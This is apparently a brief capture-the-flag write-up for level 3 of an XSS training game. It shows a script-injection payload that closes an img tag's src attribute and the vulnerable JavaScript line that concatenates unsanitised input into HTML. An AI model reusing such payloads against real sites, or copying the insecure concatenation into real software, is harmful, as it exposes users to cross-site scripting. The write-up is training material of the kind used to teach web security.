## Level 3

Payload:

```html
1.jpg' /><script>alert(0)</script>
```


Vulnerable line is in `index.html` line 17: 

```javascript
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
```

So we would like something like:

```
num = 1.jpg' /><script>alert(0)</script>
```